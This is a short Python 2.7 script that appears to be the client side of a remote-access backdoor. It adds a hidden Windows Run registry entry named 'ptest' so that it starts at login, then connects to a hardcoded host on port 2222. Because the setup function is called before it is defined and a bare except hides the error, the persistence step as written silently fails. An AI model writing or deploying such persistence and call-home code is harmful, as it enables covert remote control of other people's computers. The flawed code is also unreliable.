#!/usr/bin/python2.7
from objects import *

try:
    import _winreg
    windows_setup()
except:
    pass

HOST = "192.168.0.50"
PORT = 2222


def windows_setup():
    key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER,
                        'Software\Microsoft\Windows\CurrentVersion\Run',
                        0, _winreg.KEY_SET_VALUE)
    _winreg.SetValueEx(key, 'ptest', 0, _winreg.REG_SZ,
                    "C:\Python27\Scripts\main.lnk")
    key.Close()


if __name__ == "__main__":
    Client(HOST, PORT).run()


